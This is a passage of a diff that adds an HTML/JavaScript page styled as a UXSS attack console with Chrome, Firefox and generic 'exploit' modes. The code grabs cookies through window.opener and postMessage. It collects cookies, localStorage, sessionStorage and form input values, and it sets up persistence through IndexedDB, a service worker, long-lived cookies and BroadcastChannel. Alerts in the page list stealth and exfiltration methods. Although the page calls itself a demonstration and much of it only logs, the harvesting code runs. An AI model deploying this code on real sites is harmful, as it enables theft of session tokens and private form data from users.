+                            const cookies = opener.document.cookie;
+                            opener.postMessage({cookies: cookies}, '*');
+                        } catch(e) {}
+                    <\/script>
+                `);
+                
+                logToTerminal('about:blank parent access attempted');
+            } catch (e) {
+                logToTerminal('about:blank access blocked');
+            }
+            
+            // Method 3: jar: protocol attempt (Firefox-specific)
+            try {
+                // This is a legacy Firefox feature
+                logToTerminal('jar: protocol attempted (legacy Firefox)');
+            } catch (e) {}
+            
+            statusContext.textContent = 'Gecko Exploit';
+            statusPayload.className = 'status-value active';
+            statusPayload.textContent = 'ACTIVE';
+        }
+        
+        function attemptAboutConfigAccess() {
+            // Try to detect about:config preferences
+            const prefs = [
+                'dom.allow_scripts_to_close_windows',
+                'dom.disable_open_during_load',
+                'javascript.options.strict'
+            ];
+            
+            prefs.forEach(pref => {
+                capturedData.push(`Checking pref: ${pref}`);
+            });
+            
+            logToTerminal('about:config preference scan attempted');
+            statusContext.textContent = 'about:config';
+        }
+        
+        function abuseWebExtensionsAPI() {
+            // Simulate WebExtensions API abuse
+            logToTerminal('WebExtensions API abuse simulation');
+            
+            // Try to detect installed extensions
+            const extensionPatterns = [
+                'chrome-extension://',
+                'moz-extension://'
+            ];
+            
+            extensionPatterns.forEach(pattern => {
+                try {
+                    // This would attempt to communicate with extensions
+                    capturedData.push(`Extension pattern: ${pattern}`);
+                } catch (e) {}
+            });
+            
+            statusContext.textContent = 'WebExtensions';
+        }
+        
+        function establishFirefoxPersistence() {
+            // Firefox-specific persistence techniques
+            logToTerminal('Establishing Firefox persistence...');
+            
+            // Try to write to indexedDB
+            try {
+                const request = indexedDB.open('uxss-persistence', 1);
+                request.onupgradeneeded = function(e) {
+                    const db = e.target.result;
+                    db.createObjectStore('payloads');
+                };
+                request.onsuccess = function(e) {
+                    const db = e.target.result;
+                    const tx = db.transaction('payloads', 'readwrite');
+                    tx.objectStore('payloads').add('uxss-payload', 'main');
+                    logToTerminal('IndexedDB persistence established');
+                };
+            } catch (e) {
+                logToTerminal('IndexedDB blocked: ' + e.message);
+            }
+            
+            // Try Service Worker registration
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register('/sw.js')
+                    .then(reg => {
+                        logToTerminal('Service Worker registered');
+                    })
+                    .catch(e => {
+                        logToTerminal('Service Worker blocked: ' + e.message);
+                    });
+            }
+            
+            statusContext.textContent = 'Persistence';
+        }
+        
+        // ==================== UNIVERSAL FUNCTIONS ====================
+        
+        function startAttack(type) {
+            if (attackActive) {
+                alert('Attack already in progress!');
+                return;
+            }
+            
+            attackActive = true;
+            attackStage = 1;
+            startTime = Date.now();
+            
+            // Reset progress
+            attackProgress.style.display = 'block';
+            progressBar.style.width = '0%';
+            
+            // Update status
+            attackStatus.textContent = 'ATTACKING';
+            payloadStatus.textContent = 'EXECUTING';
+            targetStatus.textContent = 'ALL ORIGINS';
+            
+            // Update status panel
+            statusPayload.className = 'status-value active';
+            statusPayload.textContent = 'ACTIVE';
+            statusSecurity.textContent = 'UNDER ATTACK';
+            
+            logToTerminal(`Starting ${type}...`);
+        }
+        
+        function accessSensitiveData() {
+            // Attempt to access sensitive data from current origin
+            const sensitiveData = {
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                currentUrl: window.location.href,
+                referrer: document.referrer
+            };
+            
+            capturedData.push(JSON.stringify(sensitiveData, null, 2));
+            logToTerminal(`Sensitive data captured: ${Object.keys(sensitiveData).length} items`);
+            
+            // Simulate stealing form data
+            const forms = document.querySelectorAll('form');
+            forms.forEach((form, i) => {
+                const formData = {};
+                form.querySelectorAll('input, textarea, select').forEach(input => {
+                    formData[input.name || `input_${i}`] = input.value;
+                });
+                capturedData.push(`Form ${i}: ${JSON.stringify(formData)}`);
+            });
+            
+            statusContext.textContent = 'Data Access';
+        }
+        
+        function establishPersistence() {
+            // Establish various persistence mechanisms
+            
+            // 1. localStorage persistence
+            localStorage.setItem('uxss-persistence', Date.now().toString());
+            
+            // 2. Cookie persistence
+            document.cookie = 'uxss-payload=active; path=/; max-age=31536000';
+            
+            // 3. Window.name persistence
+            window.name = 'uxss-persistent-' + Date.now();
+            
+            // 4. BroadcastChannel for cross-tab communication
+            if ('BroadcastChannel' in window) {
+                try {
+                    const channel = new BroadcastChannel('uxss-channel');
+                    channel.postMessage({type: 'persistence', time: Date.now()});
+                    logToTerminal('BroadcastChannel persistence established');
+                } catch (e) {}
+            }
+            
+            logToTerminal('Persistence mechanisms established');
+            statusContext.textContent = 'Persistence';
+        }
+        
+        function updateProgress(percent) {
+            progressBar.style.width = `${percent}%`;
+        }
+        
+        function showAttackResults() {
+            const totalData = capturedData.reduce((sum, item) => sum + item.length, 0);
+            const dataKB = (totalData / 1024).toFixed(2);
+            
+            const results = `
+🔥 UXSS ATTACK COMPLETE 🔥
+
+Browser: ${currentBrowser}
+Attack Duration: ${Math.floor((Date.now() - startTime) / 1000)}s
+Data Captured: ${dataKB} KB
+Items Captured: ${capturedData.length}
+Attack Stage: ${getStageName(attackStage)}
+
+=== CAPTURED DATA SUMMARY ===
+${capturedData.slice(0, 5).map((d, i) => `[${i+1}] ${d.substring(0, 100)}...`).join('\n')}
+${capturedData.length > 5 ? `... and ${capturedData.length - 5} more items` : ''}
+
+⚠️ DEMONSTRATION ONLY - NO DATA WAS ACTUALLY STOLEN
+            `;
+            
+            logToTerminal('Attack completed successfully!');
+            alert(results);
+            
+            // Update final status
+            attackStatus.textContent = 'COMPLETE';
+            payloadStatus.textContent = 'DORMANT';
+            statusStage.textContent = 'Complete';
+        }
+        
+        // ==================== CONTROL FUNCTIONS ====================
+        
+        function launchAutoUXSS() {
+            if (!confirm('🤖 AUTO-DETECT UXSS ATTACK\n\nWill detect browser and launch appropriate exploit.\nContinue?')) return;
+            
+            if (currentBrowser.includes('Chrome')) {
+                launchChromeUXSS();
+            } else if (currentBrowser.includes('Firefox')) {
+                launchFirefoxUXSS();
+            } else {
+                alert('Browser not recognized. Using generic UXSS attempt.');
+                startAttack('Generic UXSS');
+                genericUXSS();
+            }
+        }
+        
+        function genericUXSS() {
+            // Generic UXSS attempts that work across browsers
+            logToTerminal('Launching generic UXSS attack...');
+            
+            // Try various generic methods
+            const methods = [
+                'postMessage exploitation',
+                'localStorage hijacking',
+                'BroadcastChannel abuse',
+                'window.opener chain'
+            ];
+            
+            methods.forEach((method, i) => {
+                setTimeout(() => {
+                    logToTerminal(`Attempting: ${method}`);
+                    updateProgress((i + 1) * 25);
+                    attackStage = i + 1;
+                }, i * 1000);
+            });
+            
+            setTimeout(() => {
+                showAttackResults();
+            }, methods.length * 1000);
+        }
+        
+        function showStealthMode() {
+            alert('🕶️ STEALTH MODE TECHNIQUES:\n\n1. Slow execution timing\n2. Minimal console output\n3. Encrypted payloads\n4. Memory-only execution\n5. Self-destruct after execution\n\nUsed to avoid detection by security software.');
+        }
+        
+        function showPersistence() {
+            alert('♾️ PERSISTENCE TECHNIQUES:\n\n1. Service Worker registration\n2. IndexedDB storage\n3. WebSocket reconnection\n4. Periodic reactivation\n5. Multiple fallback mechanisms\n\nEnsures attack survives page reloads and browser restarts.');
+        }
+        
+        function showExfiltration() {
+            alert('📤 DATA EXFILTRATION METHODS:\n\n1. WebSocket to attacker server\n2. Fetch requests with encoded data\n3. Image beacon tracking\n4. DNS exfiltration\n5. WebRTC data channels\n\nUsed to send stolen data to attacker-controlled servers.');
+        }
+        
+        function resetAttack() {
+            if (!confirm('Reset all attack progress?')) return;
+            
+            attackActive = false;
+            attackStage = 0;
+            capturedData = [];
+            
+            // Reset UI
+            attackProgress.style.display = 'none';
+            progressBar.style.width = '0%';
+            
+            attackStatus.textContent = 'READY';
+            payloadStatus.textContent = 'LOADED';
+            targetStatus.textContent = 'ALL TABS';
+            
+            // Reset status panel
+            statusPayload.className = 'status-value danger';
+            statusPayload.textContent = 'NO';
+            statusStage.textContent = 'Initial';
+            statusContext.textContent = 'Same-Origin';
+            statusTabs.textContent = '0 tabs';
+            statusData.textContent = '0 bytes';
+            statusSecurity.textContent = 'HIGH ALERT';
+            
+            logToTerminal('Attack reset to initial state');
+        }
+        
+        function toggleStatusPanel() {
+            statusPanel.style.display = statusPanel.style.display === 'none' ? 'block' : 'none';
+        }
+        
+        // Initialize on load
+        window.addEventListener('load', init);
+        
+        // Listen for postMessage attempts (simulated UXSS communication)
+        window.addEventListener('message', function(e) {
+            if (e.data && e.data.type === 'uxss-data') {
+                logToTerminal('Received UXSS data from iframe');
+                capturedData.push(JSON.stringify(e.data.data));
+            }
+        });
+    </script>
+</body>
+</html>
